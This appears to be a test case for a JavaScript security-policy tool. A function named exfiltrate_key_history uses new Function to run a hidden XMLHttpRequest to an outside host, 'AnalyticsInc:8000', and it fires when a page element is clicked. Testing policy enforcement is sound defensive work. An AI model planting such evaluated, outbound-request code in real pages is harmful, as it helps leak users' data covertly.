introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func", true);xmlhttp.send(null);';
  var tmpFunc = new Function(exp);
  tmpFunc();
}
document.getElementById("test").onclick = exfiltrate_key_history

}
